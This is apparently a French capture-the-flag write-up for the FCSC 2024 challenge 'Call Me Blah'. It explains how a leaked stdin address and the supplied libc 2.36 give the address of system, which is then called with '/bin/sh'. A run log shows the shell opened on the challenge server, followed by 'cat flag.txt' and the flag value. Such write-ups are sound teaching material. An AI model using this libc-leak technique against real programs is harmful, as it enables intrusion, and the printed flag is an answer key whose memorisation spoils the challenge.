# Call Me Blah

<img alt="énoncé du challenge" src="enonce.png" width=300>

Les fichiers fournis :
- [call-me-blah](call-me-blah)
- [call-me-blah.c](call-me-blah.c)
- [ld-2.36.so](ld-2.36.so)
- [libc-2.36.so](libc-2.36.so)

----

L'analyse de `call-me-blah.c` montre que le binaire :
- affiche l'adresse mémoire de `stdin`
- puis nous invite à saisir l'adresse `call_me` d'une fonction à appeler et la valeur de son paramètre `blah`.

Pour obtenir un shell, il suffirait que :
- `call_me` : soit l'adresse de la fonction `system`
- `blah` : la chaine `/bin/sh`

Or comme on dispose de la libc utilisée `libc-2.36.so` :
- on peut calculer l'adresse relative de `system` par rapport à `stdin` dans la libc
- utiliser l'adresse mémoire de `stdin` affichée à l'exécution, pour calculer celle de `system` (grâce à l'adresse relative de `system` par rapport à `stdin`)

La difficulté est ici de trouver à quel symbol `stdin` correspond dans la libc : il s'agit de `_IO_2_1_stdin_`

On se sert du script [`call-me-blah.py`](./call-me-blah.py) pour réaliser notre exploit. Une fois un shell obtenu sur le serveur, le flag est rapidement trouvé :

```sh
$ python3 call-me-blah.py REMOTE
[*] '/fcsc_2024/call-me-blah/call-me-blah'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to challenges.france-cybersecurity-challenge.fr on port 2103: Done
[*] '/fcsc_2024/call-me-blah/libc-2.36.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/fcsc_2024/call-me-blah/ld-2.36.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] 0x6e54ae3fca80
leak_stdin_address='6e54ae3fca80'
0x1d2a80
hex(system)='0x4c490'
hex(system)='0x6e54ae276490'
system=121309978125456
[*] Switching to interactive mode
$ ls
call-me-blah
flag.txt
$ cat flag.txt
FCSC{c22407092c870dfb9b6ee7e5277015de9c2a6fbc16a251237c037e73eb7a3a7e}
```
